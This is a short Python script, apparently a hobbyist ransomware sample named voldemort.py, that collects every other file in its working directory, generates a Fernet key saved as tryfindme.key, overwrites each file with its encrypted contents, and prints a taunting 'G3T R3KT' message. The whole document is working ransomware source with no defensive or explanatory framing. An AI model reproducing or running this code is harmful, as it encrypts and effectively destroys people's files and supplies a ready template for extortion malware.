#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file == "voldemort.py" or file == "tryfindme.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()
with open("tryfindme.key", "wb") as thekey:
    thekey.write(key)

f = Fernet(key)  # fixed: create once outside loop
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    encrypted = f.encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(encrypted)

print("3NCRYPT3D!!! G3T R3KT L0L")
